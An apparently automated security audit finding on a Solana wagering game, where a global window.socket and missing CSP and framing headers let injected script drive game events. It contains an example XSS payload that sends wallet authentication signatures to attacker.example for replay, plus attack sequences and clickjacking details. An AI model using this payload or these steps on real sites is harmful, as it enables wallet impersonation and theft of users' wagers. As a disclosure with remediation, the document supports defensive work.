# H032 — window.socket Global XSS Escalation

**Hypothesis ID:** H032
**Investigator:** Dinh's Bulwark Pipeline — Phase 3 Hypothesis Investigation
**Date:** 2026-02-23
**Category:** WEB-02 (CSP / Client Security), CHAIN-03 (Wallet Adapter), AUTH-01 (Authentication)
**Origin:** ARCHITECTURE.md Intersection 4 (WebSocket Surface x Client-Side Security), H-3 / H-13

---

## Verdict: CONFIRMED

**Severity: HIGH**

The hypothesis is confirmed in full on both of its primary pillars:

1. `window.socket` is unconditionally assigned at module load and is readable and writable by any JavaScript executing in the page.
2. The Vercel-served client has no Content Security Policy, no `X-Frame-Options`, no `X-Content-Type-Options`, and no `Referrer-Policy`.

The combination creates a confirmed XSS escalation path: any script injected into the page gains immediate, unauthenticated access to the live Socket.IO server connection and can emit all socket events without performing the wallet authentication flow. Six of those events (`weaponPick`, `shoot`, `weaponChange`, `angleChange`, `powerChange`, `giveTurn`) carry no server-side authentication check at all. Additional authenticated events are accessible because the victim's session flag (`client.isAuthenticated`) is already set on the server by the time any in-session XSS fires.

The second arm of the hypothesis — `window.solWallet` global enabling direct wallet-signing from injected code — is **not confirmed**. The CS-04 remediation removed that global; all signing functions are now in React Context and are not accessible from arbitrary page JavaScript. This reduces the escalation path from "wallet drain" to "full match manipulation and denial of winnings," which remains HIGH severity given active SOL wagers.

Severity is assessed HIGH (not CRITICAL) for two reasons: (a) `window.solWallet` is gone, preventing direct transaction signing by injected code; (b) no currently-active CVE provides a reliable XSS entry point in this specific bundle. The attack requires a precondition XSS vector. However, the *consequence* if that precondition is met is severe enough that the issue warrants immediate remediation.

## Evidence

### 1. window.socket — Unconditional Global Assignment

**File:** `client/src/App.js:20`

```js
// Keep socket on window for Phaser + WalletContext access
window.socket = socket;
```

This line executes at module load time, before any React component mounts. It is not guarded by environment, authentication state, or any conditional. The `socket` object is the live `socket.io-client` instance connected to the game server.

The assignment is permanent for the page lifetime. There is no code path that nulls or replaces `window.socket` during normal operation. From the moment the page loads, any script executing in the page — whether from the application bundle, an injected XSS payload, a compromised dependency, or a malicious browser extension with `content_script` access — can read and use the full Socket.IO API through this global.

**Usage breadth:** The global is accessed at 60+ call sites across 14 source files:

| File | Usage |
|------|-------|
| `App.js` | `rejoinRoom` emit, `rejoinSuccess` / `connect` listener registration |
| `wallet/WalletContext.js` | `authenticate` emit, `escrowDepositConfirm` emit, `suspiciousTx` emit, `authResult` / `shotInfo` listener registration |
| `scenes/main/index.js` | `positionUpdate`, `leaveRoom` emits; multiple listener registrations |
| `classes/Tank.js` | `stepLeft`, `stepRight`, `powerChange` emits |
| `classes/Turret.js` | `angleChange` emit |
| `screens/LobbyScreen.js` | `createRoom`, `joinRoom`, `joinQueue`, `leaveQueue`, `deleteRoom`, `getRooms` emits |
| `screens/BattleScreen.js` | `leaveRoom` emit; `escrowDeposit` event handler registered |
| `screens/ShopScreen.js` | `ready`, `shopDone`, `buyWeapon` emits |
| `screens/WinScreen.js` / `LoseScreen.js` | `playAgainRequest`, `leaveRoom` emits |
| `screens/PrestigeScreen.js` | `prestigeBurn` emit |
| `screens/BarracksScreen.js` | Socket listener registration |
| `screens/LoadingScreen.js` | Socket listener registration |
| `hooks/useSocket.js` | Generic listener registration for all subscribed events |

Any injected script can call every one of these emit targets without restriction.

### 2. No CSP on Vercel-Served Client

**File:** `client/vercel.json`

```json
{
  "framework": "create-react-app",
  "buildCommand": "npm run build",
  "outputDirectory": "build",
  "rewrites": [
    { "source": "/(.*)", "destination": "/index.html" }
  ],
  "headers": [
    {
      "source": "/static/(.*)",
      "headers": [
        { "key": "Cache-Control", "value": "public, max-age=31536000, immutable" }
      ]
    }
  ]
}
```

The `headers` array contains exactly one entry. It applies only to paths matching `/static/(.*)` and sets only `Cache-Control`. There is no:

- `Content-Security-Policy` on any path (including the root `index.html` response)
- `X-Frame-Options` (clickjacking risk on wallet authorization UI)
- `X-Content-Type-Options` (MIME sniffing protection)
- `Referrer-Policy`
- `Permissions-Policy`

The server-side `helmet()` CSP (in `server/index.js`) applies only to Express API responses (`/health`, `/stats`, `/api/auth/verify`). It does not and cannot govern the Vercel-served client HTML, JS bundles, or index page. These are two independently deployed services with separate header configurations. The absence of CSP on the client is not offset by the server's helmet configuration.

**Direct consequence:** Without `script-src`, any XSS payload that reaches the DOM executes with no browser-level containment. Without `X-Frame-Options: DENY`, the wallet modal and wager confirmation UI can be embedded in a malicious iframe for clickjacking. Without `X-Content-Type-Options: nosniff`, MIME-type-based attacks are not blocked at the browser layer.

**Source:** grep of `window.solWallet =` across all client source files returned zero assignment matches. Only comment references exist:

```

client/src/screens/LobbyScreen.js:292:      // CS-04: Use context hook instead of window.solWallet
client/src/App.js:26:                        // CS-04: Use wallet adapter hook directly for rejoin logic (avoids window.solWallet)
client/src/screens/PrestigeScreen.js:192:   // CS-04: Use context hook instead of window.solWallet
client/src/screens/BattleScreen.js:100:     // CS-04: Use context hook instead of window.solWallet
client/src/components/WalletDisplay.js:35:  // CS-04: Use context hook instead of window.solWallet
```

The CS-04 remediation is complete. `signAndSendEscrowDeposit` and `signAndBurnShot` are accessible only through the `useSolShotWallet()` React Context hook. Injected scripts cannot call these functions without access to the React Context tree, which is not exposed globally.

**Residual risk from window.socket as a signing-adjacent surface:** While injected code cannot call `signAndSendEscrowDeposit()` directly, it can intercept the `escrowDeposit` server event that carries the serialized transaction:

```js
// From server/socket-io/main.js:1041-1050
hostSocket.emit('escrowDeposit', {
    roomId,
    transaction: hostDeposit.transaction,   // base64-encoded serialized TX
    escrowPDA: escrowResult.escrowPDA,
    wager: wagerAmount,
    depositDeadlineMs: depositDeadline
});
```

An XSS payload with access to `window.socket` can register a listener on `escrowDeposit` and observe the raw base64 transaction bytes, the room ID, the escrow PDA, and the wager amount before the legitimate `BattleScreen.js` handler processes them. Additionally, the XSS can emit `escrowDepositConfirm` with a crafted or replayed `txSignature` value directly, bypassing the legitimate on-chain signing flow entirely (subject to the server's single 2s on-chain verification — see H016 / C-11 cross-reference).

### 4. Exploitable Server Events Accessible via window.socket

An injected script using the victim's `window.socket` gains access to their live server session. The victim's socket already has `client.isAuthenticated = true` and `client.roomId` set. All server-side guards that rely on the `isAuthenticated` flag treat this socket as authenticated — the injected script inherits that trust without performing the wallet signature flow.

The following is the complete inventory of exploitable events, categorized by the protection model that fails:

#### 4a. Unauthenticated Events — No Auth Check on Server (H016)

These events require no authentication whatsoever. Any socket — including one opened by injected code that has never performed `authenticate` — can send them. When sent from the victim's existing socket, they are additionally unrestricted because the socket already has `client.roomId`:

| Event | Server File:Line | Impact via Injected Script |
|-------|-----------------|---------------------------|
| `weaponPick` | `main.js:1650` | Spoof opponent's weapon selection display; inject false `arrayIndex` values to opponent's client |
| `shoot` | `main.js:1697` | Inject phantom shot visuals to opponent during battle state; cause rendering desync |
| `weaponChange` | `main.js:2348` | Continuous weapon-change flicker on opponent's UI during active play |
| `angleChange` | `main.js:2356` | Continuous aiming disruption on opponent's HUD; render false angle indicators |
| `powerChange` | `main.js:2364` | Continuous power-display disruption on opponent's HUD |
| `giveTurn` | `main.js:2479` | Inject arbitrary `terrainData`, `pos1`, `pos2`, `rotation1`, `rotation2` into opponent's `recieveTurn` handler; unbounded payload relay (no `maxHttpBufferSize` configured per H028) |

All six of these are confirmed in H016 with exact server code. An in-session XSS can spam all six events simultaneously at whatever rate the Socket.IO connection allows (no per-event rate limiting).

#### 4b. Auth-Flag-Gated Events — Accessible Because Session Is Already Authenticated

These events call `requireAuth(client, ...)` which checks `client.isAuthenticated`. When injected code runs during the victim's session, `client.isAuthenticated` is already `true` on the server (the victim already authenticated). The injected script therefore passes these guards without needing to produce a wallet signature:

| Event | Server Impact |
|-------|--------------|
| `ready` | Mark victim as ready before they intend to; force-start match |
| `shopDone` | End weapon shop phase early for victim; prevent weapon purchases |
| `leaveRoom` | Disconnect victim from their own match mid-game; forfeit active wager |
| `playAgainRequest` | Trigger phantom rematch after legitimate match ends (Intersection 5 / Attack 2) |
| `escrowDepositConfirm` | Send crafted `txSignature` to server's deposit confirmation handler; circumvent legitimate deposit flow |
| `prestigeBurn` | Submit crafted burn transaction signature to claim tier advancement |
| `buyWeapon` | Spend victim's gold on unwanted weapons |
| `deleteRoom` | Destroy host's own room if victim is host |
| `positionUpdate` | Move victim's tank to attacker-optimal position (400px tolerance per event) |

The `escrowDepositConfirm` path is particularly notable: the server checks the on-chain transaction at `main.js:1722` but only with a single 2-second retry (H016/C-11). An injected script can spoof confirmation of a transaction that was never submitted to chain, and the server may accept it.

#### 4c. Event Interception — Server-to-Client Events the Injected Script Can Listen On

Using `window.socket.on(...)`, injected code can register listeners on all server-emitted events. This enables passive intelligence collection during an active wagered match:

| Event | Interceptable Data |
|-------|-------------------|
| `escrowDeposit` | base64 serialized deposit TX, escrow PDA address, wager amount |
| `matchEnd` | Winner identity, settlement transaction signature |
| `shotInfo` | SHOT balance, prestige tier |
| `gameState` / room events | Full room state including opponent's position, HP, weapons |
| `authResult` | Server's confirmation of authentication |

The `escrowDeposit` interception is the highest-value observation: the raw base64 transaction plus the roomId can be forwarded to an external server via `fetch()` before the victim's wallet adapter processes it. While this does not allow the attacker to sign the transaction (CS-04 removed that global), it allows replay analysis and could be used to construct a competing `escrowDepositConfirm` event with a different `txSignature`.

### 5. Precondition Analysis — What XSS Vectors Exist

The `window.socket` escalation path requires an XSS precondition. The following sources are assessed:

| XSS Vector | Current Status | Notes |
|-----------|---------------|-------|
| `webpack` DOM-clobbering gadget (GHSA-4vvj-4cpr-p986) | Inactive (mitigated by react-scripts static `publicPath`) | Activates if `publicPath: 'auto'` is ever set; fixed in webpack >=5.94.0 |
| `loader-utils` prototype pollution (GHSA-76p3-8jx3-jpfq) | Not production-reachable | Build-time only; not in bundle |
| `form-data` Math.random() MIME (GHSA-fjxv-7rqg-78g4) | Not production-reachable | Build-time transitive dep |
| Phaser 3.55.2 (2 years behind 3.87.x) | No current CVE | Large engine; high surface area; future CVE would land directly in `window.socket` context |
| `bigint-buffer` buffer overflow (GHSA-3gc7-fjrx-p6mg) | Reduced impact in browser (no native addon) | Triggered during SHOT token deserialization; pure-JS fallback only |
| User-controlled string rendered as React text | No `dangerouslySetInnerHTML` or `innerHTML` found in any client source | React's default escaping provides standard XSS protection for text content |
| Third-party script CDN includes | None found in client build | Self-contained CRA bundle only |
| Clickjacking via iframe embedding | Enabled — no `X-Frame-Options` on Vercel | Wallet modal and wager confirmation UI can be framed by attacker |

No currently-active XSS vector exists that reliably executes arbitrary JavaScript in the deployed bundle. This is the primary reason severity is HIGH rather than CRITICAL.

The two realistic future risk scenarios are:
1. A future Phaser 3 vulnerability (engine is 2 years stale). Any Phaser XSS would have immediate `window.socket` access in a page with no CSP containment.
2. A developer configuration change that sets `publicPath: 'auto'` in webpack, activating the dormant GHSA-4vvj-4cpr-p986 DOM-clobbering gadget.

The clickjacking surface (no `X-Frame-Options`) is an active, present-day risk that does not require finding an XSS CVE — it allows UI redressing of the wallet connect and wager confirmation flows.

## Attack Scenarios

### Scenario A: In-Session Injected Script — Match Disruption and Wager Denial

**Prerequisites:** Any XSS achieving code execution in the victim's page during an active wagered match.

**Attack sequence:**
1. XSS payload reads `window.socket` — already connected, already has `client.roomId` and `client.isAuthenticated = true` server-side
2. Payload emits `leaveRoom` — server disconnects victim from their own match; if funds were deposited, the disconnect handler executes
3. Alternatively: payload emits `shopDone` during weapon shop, forcing victim into match before they are ready with optimal loadout
4. During battle: payload spams `angleChange`, `powerChange`, and `weaponChange` events to disrupt opponent's HUD
5. Payload registers listener on `matchEnd` to exfiltrate settlement transaction signature for later analysis
6. Payload emits `escrowDepositConfirm` with a crafted or zero-value `txSignature` before the victim's legitimate wallet flow completes

**Impact in wagered match:** Victim's active SOL wager is at risk. The attacker either causes the victim to forfeit (leaveRoom) or manipulates match state to benefit the opponent. The victim has no indication that injected code is running — all interactions appear to come from their own socket connection.

### Scenario B: window.socket Overwrite — Silent Redirect of Auth Messages

**Prerequisites:** XSS executing before or during the victim's `authenticate()` call.

Rather than using `window.socket` read-only, an XSS payload can overwrite it with a mock Socket.IO object:

```js
// Injected payload
const realSocket = window.socket;
window.socket = {
    emit: (event, data) => {
        if (event === 'authenticate') {
            // Forward wallet address + signature + timestamp to attacker's server
            fetch('https://attacker.example/collect', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        }
        // Optionally relay to real socket to avoid detection
        realSocket.emit(event, data);
    },
    on: realSocket.on.bind(realSocket),
    off: realSocket.off.bind(realSocket),
    connected: true,
    id: realSocket.id,
};
```

This captures the full `{ walletAddress, message, signature, timestamp }` auth payload as it leaves `WalletContext.js:authenticate()` at line 185. Given the server's 5-minute replay window and no nonce in the signed message (H016 / CHAIN-03-F08), the captured auth payload can be replayed on a new socket connection within 5 minutes to impersonate the victim's wallet address.

**Impact:** Attacker authenticates as victim on a separate socket. Can then create/join wagered rooms attributed to victim's wallet address. Server-side state (`authenticatedWallets[socket.id]`) maps attacker's socket to victim's address.

### Scenario C: Clickjacking — Wallet Modal Framing

**Prerequisites:** None. Active today with no XSS required.

The Vercel client serves the game without `X-Frame-Options` or a restrictive CSP `frame-ancestors` directive. An attacker can embed the SolShot game in a cross-origin `<iframe>` on a malicious page and place transparent UI elements over the Phantom wallet approval dialogs.

The Phantom wallet modal presents prompts like:
- "Sign Message: SolShot Auth: [address] at [timestamp]" (authentication)
- "Approve Transaction: Transfer [X] SOL to [escrow PDA]" (wager deposit)
- "Approve Transaction: Burn [Y] SHOT" (prestige burn)

With the game framed and the wallet modal visible, a clickjacking overlay can trick the victim into approving these actions under false pretenses.

**Impact:** Victim unknowingly deposits into an attacker-controlled match, burns SHOT without intending to, or authenticates with an attacker-controlled server — all without any XSS being required.

## Recommendations

Recommendations are ordered by implementation cost vs. risk reduction. R1 and R2 are independent of each other and both should be deployed before mainnet.

### R1 — Add Security Headers to client/vercel.json (HIGH PRIORITY — Before Mainnet)

The single highest-leverage fix: add a CSP and supporting security headers to the Vercel configuration. This addresses the no-containment condition that makes XSS maximally dangerous and independently prevents clickjacking.

Replace the current `client/vercel.json` headers section with:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=()" },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; connect-src 'self' https://api.devnet.solana.com wss://api.devnet.solana.com https://solshot-server.onrender.com wss://solshot-server.onrender.com; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; frame-src 'none'; object-src 'none'; base-uri 'self';"
        }
      ]
    },
    {
      "source": "/static/(.*)",
      "headers": [
        { "key": "Cache-Control", "value": "public, max-age=31536000, immutable" }
      ]
    }
  ]
}
```

Notes:
- `script-src 'self'` — blocks injected inline scripts and scripts from external origins. This is the primary XSS containment directive.
- `'unsafe-inline'` in `style-src` may be necessary for Phaser.js canvas styling and React inline styles. `'unsafe-eval'` must NOT be added.
- `X-Frame-Options: DENY` blocks all iframe embedding, preventing the wallet modal clickjacking scenario immediately.
- `frame-src 'none'` in CSP is the modern equivalent; both are needed for maximum browser compatibility.
- Adjust `connect-src` if the mainnet RPC endpoint differs from the devnet entry.

### R2 — Move window.socket to React Context (MEDIUM PRIORITY — Before Mainnet)

Remove the `window.socket = socket` global assignment from `App.js`. Instead, pass the socket instance through a React context (parallel to the existing `SolShotWalletContext`), which makes it accessible to all React components and hooks without exposing it on `window`.

This prevents injected scripts from accessing the socket object even if a future XSS occurs. The Phaser scene integration (the original reason for the global) would require passing the socket reference into Phaser's scene data on initialization.

```js
// App.js — remove this line
window.socket = socket;

// New: SocketContext.js
export const SocketContext = createContext(null);
// Wrap app with <SocketContext.Provider value={socket}>

// Phaser scene initialization — pass socket as scene data
this.scene.start('MainScene', { socket });
```

This is the higher-effort fix. R1 should deploy first as an independent layer.

### R3 — Add nonce to auth message to prevent replay (HIGH PRIORITY — from CHAIN-03-F08)

The `window.socket` mock-object interception attack in Scenario B relies on the 5-minute replay window for captured auth signatures. Binding the signed message to the socket ID eliminates replay value:

```js
// WalletContext.js authenticate() — change message to include socket ID
const message = `SolShot Auth: ${walletAddress} at ${timestamp} socket:${window.socket?.id}`;
```

The server must verify that `socket.id` in the signed message matches the connecting socket. This makes captured auth signatures valid only for the specific socket they were captured on — replay to a new socket fails because the new socket has a different ID.

### R4 — Upgrade Phaser from 3.55.2 to current (MEDIUM PRIORITY — Ongoing)

Phaser 3.55.2 is 2 years behind current (3.87.x as of 2026-02). It is the largest single dependency in the client bundle (~3MB) and has significant DOM and canvas interaction surface. A future Phaser CVE enabling XSS would land directly in a page with `window.socket` accessible and (currently) no CSP. R1 addresses the no-CSP part; upgrading Phaser reduces the "future CVE" probability.

### R5 — Upgrade webpack via react-scripts (LOWER PRIORITY)

The webpack DOM-clobbering gadget (GHSA-4vvj-4cpr-p986) is dormant given the current `publicPath` configuration but activates if `publicPath: 'auto'` is ever set. Upgrade to webpack >=5.94.0 when react-scripts 6.x becomes available or via `react-app-rewired`.
